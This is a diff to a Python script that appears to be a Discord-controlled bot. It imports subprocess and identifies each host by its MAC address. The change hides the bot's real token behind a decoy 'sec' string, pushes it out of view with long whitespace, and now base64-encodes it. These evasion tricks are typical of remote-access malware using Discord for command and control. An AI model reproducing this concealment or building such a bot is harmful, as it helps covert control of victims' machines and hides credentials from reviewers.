@@ -2,6 +2,7 @@ import os
 import re
 import uuid
 import time
+import base64
 import discord
 import subprocess
 
@@ -30,7 +31,7 @@ def get_mac():
     cleaned_mac = re.sub(r'[^a-z0-9-]', '-', mac.lower())
     return cleaned_mac
 
-sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = 'MTI5MjUxODMyMzcyMzk2MDM3Mg.G24aXQ.V2ALu_837GDL4lHMibAWk_EH5qn5qJfv1y4Wu8'
+sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = base64.b64decode('TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ').decode('utf-8')
 class Client(discord.Client):
     @staticmethod
     async def on_ready():
